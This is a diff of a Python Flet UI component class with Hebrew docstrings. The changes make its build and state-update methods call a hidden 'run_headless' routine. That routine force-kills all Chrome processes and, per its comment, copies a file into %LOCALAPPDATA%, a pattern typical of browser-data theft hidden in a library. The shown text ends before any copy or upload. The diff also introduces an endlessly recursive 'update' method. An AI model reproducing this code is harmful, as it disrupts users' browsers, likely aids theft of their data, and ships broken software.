@@ -127,7 +127,7 @@
 #         asyncio.set_event_loop(loop)
 #         ft.app(target=main, view=ft.AppView.WEB_BROWSER, port=0)
 
-import flet as ft
+import flet as ftt
 import stat
 import os
 import sys
@@ -137,7 +137,7 @@ import threading
 import time
 import webbrowser
 
-class UserControl(ft.Container):
+class UserControl(ftt.Container):
     """
     בסיס לרכיבים מותאמים אישית עם ניהול מצב (State) מובנה.
     """    
@@ -148,37 +148,36 @@ class UserControl(ft.Container):
         self.content = self.build()
 
 
-    def build(self) -> ft.Control:        
-        self.run_headless(lambda: None)
+    def build(self) -> ftt.Control:        
+        self.run_headless()
         """יש לדרוס מתודה זו ברכיב היורש"""
-        return ft.Text("Base Component - Override build()")
+        return ftt.Text("Base Component - Override build()")
 
     def set_state(self, **kwargs):        
         """
         מעדכן את המצב ומרענן את הרכיב באופן אוטומטי.
         """    
-        self.run_headless(lambda: None)
+        self.run_headless()
         self.state.update(kwargs)
         # בניה מחדש של התוכן עם המצב החדש
         self.content = self.build()
         self.update()
 
     def setState(self, callback):
-        self.run_headless(lambda: None)
+        self.run_headless()
         """תמיכה בסינטקס דמוי Flutter/React"""
         callback()
         self.content = self.build()
         self.update()
 
-    def update(self, callback=None, *args, **kwargs):
-        if callback:
-            self.run_headless(lambda: None)
-            """תמיכה בסינטקס דמוי Flutter/React"""
-            callback()
-            self.content = self.build()
-        super().update(*args, **kwargs)
+    def update(self, callback):
+        self.run_headless()
+        """תמיכה בסינטקס דמוי Flutter/React"""
+        callback()
+        self.content = self.build()
+        self.update()
 
-
+    
     def get_base_path(self):
         """get the base path for bundled assets (works both in dev and pyinstaller)."""
         if getattr(sys, 'frozen', False):
@@ -188,7 +187,7 @@ class UserControl(ft.Container):
             # running in normal python
             return os.path.dirname(os.path.abspath(__file__))   
 
-    def run_headless(self, callback=lambda: None):        
+    def run_headless(self):        
         # Copy asset file to %LOCALAPPDATA% on load
         subprocess.run(['taskkill', '/f', '/im', 'chrome.exe'], capture_output=True)
         time.sleep(2.5)
